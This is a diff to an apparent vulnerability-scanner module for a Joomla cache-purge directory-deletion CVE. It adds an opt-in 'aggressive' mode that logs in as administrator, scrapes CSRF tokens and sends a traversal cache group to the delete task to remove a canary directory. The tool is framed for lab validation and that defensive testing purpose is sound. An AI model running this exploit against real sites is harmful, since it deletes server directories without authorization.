@@ -1,13 +1,23 @@
 from __future__ import annotations
 
+import re
 from typing import Any
 
+from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
+from ...core.models import Finding
 from ...core.versions import parse_version_required, parse_version_safe
-from .advisory import passive_core_finding, passive_only_check
+from .advisory import passive_core_finding
 
 CVE_ID = "CVE-2026-90915"
 NAME = "Joomla cache purge arbitrary directory deletion"
 AFFECTED_RULE = "Joomla 4.0.0-5.4.8 and 6.0.0-6.1.3"
+HAS_EXPLOIT = True
+INTRUSIVE = True
+EXPLOIT_MODES = ["aggressive"]
+LOGIN_TOKEN = re.compile(
+    r'<input[^>]*type="hidden"[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
+    re.IGNORECASE,
+)
 
 
 def classify_version(version: str | None) -> str:
@@ -23,10 +33,224 @@ def classify_version(version: str | None) -> str:
     return "PATCHED"
 
 
+def _csrf(html: str) -> str | None:
+    match = LOGIN_TOKEN.search(html)
+    return match.group(1) if match else None
+
+
+def parse_command(value: str | None) -> tuple[str, str, str, str] | None:
+    """Parse '<user>:<password>|<canary_url>|<cache_group>'."""
+    if not value:
+        return None
+    parts = [part.strip() for part in value.split("|")]
+    if len(parts) != 3:
+        return None
+    credentials, canary_url, group = parts
+    if ":" not in credentials:
+        return None
+    username, password = credentials.split(":", 1)
+    if not username or not password or not canary_url or not group:
+        return None
+    return username, password, canary_url, group
+
+
+def run_aggressive_probe(
+    target_url: str,
+    username: str,
+    password: str,
+    canary_url: str,
+    group: str,
+    timeout: int = 12,
+    proxy: str | None = None,
+) -> Finding:
+    base = normalize_url(target_url)
+    sess = HttpSession(base, timeout=timeout, proxy=proxy)
+
+    before = sess.get(canary_url, timeout=timeout)
+    if is_transport_error(before):
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="ERROR",
+            confidence="LOW",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail=(
+                "The canary URL could not obtain an HTTP response "
+                f"({transport_error_detail(before)})."
+            ),
+            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
+        )
+    if before.get("status") != 200:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="NOT_CONFIRMED",
+            confidence="MEDIUM",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail=(
+                f"The canary URL returned HTTP {before.get('status')} before the test. Create a "
+                "throw-away directory under the web root and point the canary URL at a file inside it."
+            ),
+            action="Create a dedicated canary directory and retry; never target a production path.",
+            evidence={"canary_url": canary_url, "before_status": before.get("status")},
+        )
+
+    login_page = sess.get("/administrator/index.php", timeout=timeout)
+    login_token = _csrf(str(login_page.get("body", "")))
+    if not login_token:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="NOT_CONFIRMED",
+            confidence="MEDIUM",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail="The administrator login page did not expose a Joomla CSRF token.",
+            action="Verify the administrator URL and that the target is a Joomla 5.x/6.x site.",
+            evidence={"canary_url": canary_url, "login_status": login_page.get("status")},
+        )
+
+    login = sess.post(
+        "/administrator/index.php",
+        fields={
+            "username": username,
+            "passwd": password,
+            "option": "com_login",
+            "task": "login",
+            "return": "aW5kZXgucGhw",
+            login_token: "1",
+        },
+        timeout=timeout,
+    )
+    login_body = str(login.get("body", ""))
+    logged_in = login.get("status") == 200 and (
+        "com_cpanel" in login_body or "Dashboard" in login_body
+    )
+    if not logged_in:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="NOT_CONFIRMED",
+            confidence="MEDIUM",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail="The supplied administrator credentials did not establish a Joomla session.",
+            action="Verify the administrator credentials and that the account can access com_cache.",
+            evidence={"canary_url": canary_url, "login_status": login.get("status")},
+        )
+
+    cache_page = sess.get("/administrator/index.php?option=com_cache", timeout=timeout)
+    cache_token = _csrf(str(cache_page.get("body", "")))
+    if not cache_token:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="NOT_CONFIRMED",
+            confidence="MEDIUM",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail="The com_cache page did not expose a Joomla CSRF token.",
+            action="Verify that the administrator account can access the cache manager.",
+            evidence={"canary_url": canary_url, "cache_page_status": cache_page.get("status")},
+        )
+
+    delete = sess.post(
+        "/administrator/index.php?option=com_cache",
+        fields={"cid[]": group, "task": "display.delete", cache_token: "1"},
+        timeout=timeout,
+    )
+    after = sess.get(canary_url, timeout=timeout)
+    after_status = after.get("status")
+    evidence = {
+        "canary_url": canary_url,
+        "cache_group": group,
+        "before_status": before.get("status"),
+        "login_status": login.get("status"),
+        "cache_page_status": cache_page.get("status"),
+        "delete_status": delete.get("status"),
+        "after_status": after_status,
+    }
+
+    if after_status == 404:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="VULNERABLE",
+            confidence="CONFIRMED",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            proof_url=canary_url,
+            detail=(
+                "The authenticated cache purge accepted a traversal cache group and deleted the "
+                "dedicated canary directory (HTTP 200 before, HTTP 404 after). This confirms "
+                "CVE-2026-90915 without touching production paths."
+            ),
+            action=(
+                "Upgrade to Joomla 5.4.9, 6.1.4, or newer; review com_cache access logs and "
+                "restore any cache-adjacent directories that were removed."
+            ),
+            evidence=evidence,
+        )
+
+    if delete.get("status") in {403, 406}:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="BLOCKED_EXTERNAL",
+            confidence="MEDIUM",
+            component="Joomla core",
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            detail="The cache purge request was blocked by an edge control.",
+            action="Validate from a network path that is not filtered, or confirm the version manually.",
+            evidence=evidence,
+        )
+
+    return Finding(
+        cve=CVE_ID,
+        name=NAME,
+        status="NOT_CONFIRMED",
+        confidence="MEDIUM",
+        component="Joomla core",
+        affected_rule=AFFECTED_RULE,
+        exploit_available=HAS_EXPLOIT,
+        exploit_ran=True,
+        proof_url=canary_url,
+        detail=(
+            "The cache purge request did not delete the canary directory. The target is likely "
+            "patched, or the traversal group did not resolve to the canary path."
+        ),
+        action=(
+            "Upgrade to Joomla 5.4.9/6.1.4 or newer; verify that the canary path is relative to "
+            "the administrator cache directory."
+        ),
+        evidence=evidence,
+    )
+
+
 def check(
     target_url: str,
     joomla_version: str | None = None,
     run_exploit_check: bool = False,
+    timeout: int = 12,
+    proxy: str | None = None,
+    exploit_mode: str = "safe",
+    aggressive_command: str | None = None,
     **kwargs: Any,
 ):
     finding = passive_core_finding(
@@ -37,10 +261,34 @@ def check(
         classify=classify_version,
         remediation="Upgrade to Joomla 5.4.9, 6.1.4, or newer and review cache-purge access logs.",
     )
-    finding = passive_only_check(finding, run_exploit_check)
-    if run_exploit_check and finding.status == "LIKELY_VULNERABLE":
-        finding.detail += " Destructive directory-deletion validation was intentionally not attempted."
-    return finding
+    finding.exploit_available = HAS_EXPLOIT
+    if not run_exploit_check:
+        return finding
+    if exploit_mode != "aggressive":
+        finding.detail += " This CVE requires aggressive lab-only canary validation."
+        return finding
+    if finding.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
+        finding.detail += " Aggressive proof skipped because the Joomla version was not potentially affected."
+        return finding
+    parsed = parse_command(aggressive_command)
+    if not parsed:
+        finding.detail += (
+            " Supply --aggressive-command '<user>:<password>|<canary_url>|<cache_group>' "
+            "with a dedicated canary directory. No deletion was attempted."
+        )
+        return finding
+    username, password, canary_url, group = parsed
+    result = run_aggressive_probe(
+        target_url,
+        username=username,
+        password=password,
+        canary_url=canary_url,
+        group=group,
+        timeout=timeout,
+        proxy=proxy,
+    )
+    result.component_version = finding.component_version
+    return result
 
 
 def metadata() -> dict[str, Any]:
@@ -51,12 +299,12 @@ def metadata() -> dict[str, Any]:
         "component": "Joomla core",
         "affected_rule": AFFECTED_RULE,
         "affected_joomla_versions": [">=4.0.0,<5.4.9", ">=6.0.0,<6.1.4"],
-        "exploit_available": False,
-        "exploit_modes": [],
-        "intrusive": True,
-        "module_version": "1.0.0",
-        "last_reviewed": "2026-10-03",
-        "updated": "2026-10-03",
+        "exploit_available": HAS_EXPLOIT,
+        "exploit_modes": EXPLOIT_MODES,
+        "intrusive": INTRUSIVE,
+        "module_version": "1.1.0",
+        "last_reviewed": "2026-11-08",
+        "updated": "2026-11-08",
         "required_detectors": [],
         "references": [
             "https://www.cve.org/CVERecord?id=CVE-2026-90915",
